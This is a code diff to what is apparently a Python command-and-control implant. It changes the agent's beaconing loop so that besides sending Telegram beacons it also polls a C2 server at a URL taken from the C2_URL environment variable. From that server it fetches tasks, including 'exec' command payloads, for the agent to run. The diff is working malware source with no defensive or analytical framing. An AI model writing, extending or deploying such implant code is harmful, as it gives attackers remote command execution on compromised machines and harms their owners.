@@ -221,6 +221,9 @@ def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
     _total_beacons = 0
     _total_tasks = 0
     
+    # Get C2 URL from env (for HTTP beacon to public server)
+    c2_url = os.environ.get("C2_URL", "")
+    
     log(f"Telegram beacon loop started (agent={agent_id[:8]})", "START")
     
     while True:
@@ -241,16 +244,27 @@ Time: {time.strftime('%H:%M:%S')}
             telegram_send(beacon_msg)
             log(f"Beacon #{_total_beacons} sent via Telegram", "CONN")
             
-            # Check for commands from local DB (if running on same machine as C2)
-            commands = telegram_get_commands(agent_id)
+            # Get commands - try HTTP first, then local DB
+            commands = []
             
-            # Also check via HTTP to local C2 server
-            try:
-                resp = http_post("/api/agent/beacon", {"id": agent_id}, "http://127.0.0.1:5000", None, None)
-                if resp and "tasks" in resp:
-                    commands.extend(resp.get("tasks", []))
-            except:
-                pass  # Local server not available
+            # Try HTTP beacon to C2 server (public URL or localhost)
+            if c2_url:
+                try:
+                    resp = http_post("/api/agent/beacon", {"id": agent_id}, c2_url, None, None)
+                    if resp and "tasks" in resp:
+                        for t in resp.get("tasks", []):
+                            commands.append({
+                                "id": t.get("id"),
+                                "type": t.get("task_type", "exec"),
+                                "command": t.get("payload", "")
+                            })
+                        log(f"Got {len(commands)} tasks via HTTP from {c2_url}", "TASK")
+                except Exception as e:
+                    log(f"HTTP beacon failed: {e}", "DEBUG")
+            
+            # Fallback: check local DB (if running on same machine as C2)
+            if not commands:
+                commands = telegram_get_commands(agent_id)
             
             # Process commands
             for cmd in commands:
